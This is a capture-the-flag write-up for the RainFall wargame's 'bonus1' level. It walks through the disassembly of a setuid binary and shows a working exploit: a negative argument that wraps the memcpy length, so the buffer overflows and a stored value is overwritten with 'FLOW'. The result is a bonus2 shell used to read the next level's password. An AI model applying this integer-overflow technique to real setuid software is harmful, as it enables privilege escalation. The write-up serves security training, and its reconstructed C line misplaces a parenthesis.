```
bonus1@RainFall:~$ ll
total 17
dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1*
-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile
bonus1@RainFall:~$ objdump -S -M intel ./bonus1 > /tmp/a
bonus1@RainFall:~$ vim /tmp/a
```

So let's watch the first interesting things
```
804842a:       83 ec 40                sub    esp,0x40
804842d:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
8048430:       83 c0 04                add    eax,0x4
```
So what do we do here ?
we take the first argument (the argv) and we add 4, why ?
To have the argv[1]
```
8048433:       8b 00                   mov    eax,DWORD PTR [eax]
8048435:       89 04 24                mov    DWORD PTR [esp],eax
8048438:       e8 23 ff ff ff          call   8048360 <atoi@plt>
```

This is to put it into atoi
```
804843d:       89 44 24 3c             mov    DWORD PTR [esp+0x3c],eax
8048441:       83 7c 24 3c 09          cmp    DWORD PTR [esp+0x3c],0x9
8048446:       7e 07                   jle    804844f <main+0x2b>
```
Here we check if the value is under 10, if it is then we continue.

```
804844f:       8b 44 24 3c             mov    eax,DWORD PTR [esp+0x3c]
8048453:       8d 0c 85 00 00 00 00    lea    ecx,[eax*4+0x0]
804845a:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
804845d:       83 c0 08                add    eax,0x8
8048460:       8b 00                   mov    eax,DWORD PTR [eax]
8048462:       89 c2                   mov    edx,eax
```
ok soooo, this time, we take the result of the atoi function we put the result of the atoi
into the ecx, we put it times 4
And then we put the second argument of the atoi into the edx

```
048464:       8d 44 24 14             lea    eax,[esp+0x14]
8048468:       89 4c 24 08             mov    DWORD PTR [esp+0x8],ecx
804846c:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
8048470:       89 04 24                mov    DWORD PTR [esp],eax
8048473:       e8 a8 fe ff ff          call   8048320 <memcpy@plt>
```

Ok so we begin by making a buffer of size 0x14(20 bytes)
then we put the argument from right to left in the stack, so let's go.
ecx = atoi * 4
edx = argv[2]
eax, = buffer
so we call memcpy like that :
```
char buff[20];
memcpy(buff, av[2], atoi(av[1] * 4));
```

Ok keep going,
```
8048478:       81 7c 24 3c 46 4c 4f    cmp    DWORD PTR [esp+0x3c],0x574f4c46
804847f:       57
8048480:       75 1c                   jne    804849e <main+0x7a>
8048482:       c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0
8048489:       00
804848a:       c7 44 24 04 80 85 04    mov    DWORD PTR [esp+0x4],0x8048580
8048491:       08
8048492:       c7 04 24 83 85 04 08    mov    DWORD PTR [esp],0x8048583
8048499:       e8 b2 fe ff ff          call   8048350 <execl@plt>
804849e:       b8 00 00 00 00          mov    eax,0x0
```
So here what do we see ? we see that we compare the atoi with the value "FLOW"
And if it is equal we have our shell.
So now let's try the exploit
So How can we exploit this ?
We know that the atoi is at, 0x3c
we also know that our buffer is starting at, 0x14
So if we do:
0x3c - 0x14 = 40
So we know that we need a buffer of 40, BUUUUUUUUUUUUUUUUUTTTTTTTTTT
the atoi is check with lesser that 10,
So we can't ?
Of course we can, let's see the man of memcpy
```
void *memcpy(void *dest, const void *src, size_t n);
```
mhh, weird,the number that we end up using is put into a size_t, which means that we can put a negative value and it will work
Let's make the payload

./bonus1 "-2147483610" 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW'
Tadam
good job
```
bonus1@RainFall:~$ ./bonus1 "-2147483610" 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW'
$ whoami
bonus2
$ cd ../bonus2
$ ls -la
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
$ cat .pass
<hidden>
```
